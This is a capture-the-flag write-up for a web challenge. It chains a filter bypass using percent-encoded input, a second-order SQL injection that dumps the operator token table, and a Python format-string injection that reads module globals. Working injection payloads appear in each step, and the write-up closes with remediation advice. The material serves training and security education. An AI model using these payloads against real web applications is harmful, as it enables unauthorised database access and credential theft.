### TheDispatchConsole

> Web · Medium · Terminal43
> Points at solve: [fill in]

**Tools used**

Not specified.

**Approach**

Target: http://<instance>/

Three bugs chained:

1. the sanitiser inspects the **raw, still-percent-encoded** request string, so fully hex-encoding a payload bypasses it,
2. `/digest` is **second-order SQL injectable** — it interpolates stored `callsign` values into `SELECT body FROM dispatches WHERE callsign='...'`,
3. `/report` passes the user-supplied `fmt` to Python `str.format()`, giving **format-string injection** that can walk to module globals.

Step 1 — Sanitiser bypass. The app blocks SQLi tokens by scanning the raw query/body before URL-decoding. Leaking the module globals later shows the blocklist exactly:

```python
BLOCKED = ["'", '--', '/*', 'union', 'select']
```

Literal `--`, `union`, `select` and `'` are rejected with `403 request rejected by console sanitiser`, but percent-encoded forms are not seen:

```
callsign=EMBER%2d%2dx        -> 200 (decoded -- displayed)
callsign=%75nion             -> 200 (decoded union displayed)
```

For a whole payload, hex-encode every byte (`%50%34%27...`) so the raw string contains no blocked substring; the server decodes it afterwards.

Step 2 — Second-order SQLi in /digest. Writes are parameterised, and `/dispatches` is safe. But `/digest` groups the log per callsign and then re-queries using the stored callsign unescaped:

```sql
SELECT body FROM dispatches WHERE callsign = '<stored callsign>'
```

Posting a dispatch whose callsign is `ZZZ' OR '1'='1` (quotes allowed once encoded) made the digest list all rows under that group — confirmation.

Column count was established with a one-column UNION:

```
callsign = P4' UNION SELECT 'PWNED4'--
```

then the schema was dumped:

```
Q1  name FROM sqlite_master
Q2  sql  FROM sqlite_master
```

```
dispatches(id INTEGER PRIMARY KEY, callsign TEXT, body TEXT)
operators (id INTEGER PRIMARY KEY, callsign TEXT, token TEXT, role TEXT)
```

Operators table dump:

```
EMBER   <operator-token>   post
CINDER  <operator-token>   post
WARDEN  <command-token>    command
```

Step 3 — Report + format-string injection. `/report?token=<command-token>&fmt=...` passes the command check and renders `fmt.format(dispatch=dispatch)`. Python format strings allow attribute and item traversal, so the flag in module globals is directly readable:

```
fmt={dispatch.__class__.__init__.__globals__[FLAG]}
```

Response:

```
CSCTF{REDACTED}
```

`{dispatch.__dict__}` returned `{'ref': '0001', 'body': 'Command net quiet. Hold positions.'}`, confirming the report object; `__globals__` also exposed `BLOCKED`, `SEED` and `FLAG`.

**Why it works**

- The sanitiser scans the raw, percent-encoded request before decoding, so hex-encoding every byte removes every blocked substring from the inspected string — the server only decodes afterwards, and the payload then reaches the application intact.
- `/digest` treats data previously stored in the database as trusted SQL: the hostile callsign is written harmlessly as a value, then interpolated unescaped into a query when the digest re-reads it — a classic second-order injection.
- `fmt.format(dispatch=dispatch)` with an attacker-controlled format string enables attribute and item traversal (`dispatch.__class__.__init__.__globals__`), reaching the module's globals where `FLAG` lives.

Remediation (brief):

- Sanitise **decoded** values, and use an allowlist/parameterisation rather than a raw-string blocklist.
- Never trust data from the database: the digest's per-callsign query must use a bound parameter on read too.
- Do not pass user input to `str.format()` as a template; use a fixed template and pass values, or a safe templating engine.

**Validation**

403 → 200 on the percent-encoded probe tokens confirmed the sanitiser bypass; posting `ZZZ' OR '1'='1` as a callsign made `/digest` list all rows, confirming the second-order injection; `{dispatch.__dict__}` returned the expected report object, confirming traversal; the command-role token passed the `/report` gate and the rendered format string returned the flag (`CSCTF{REDACTED}`).
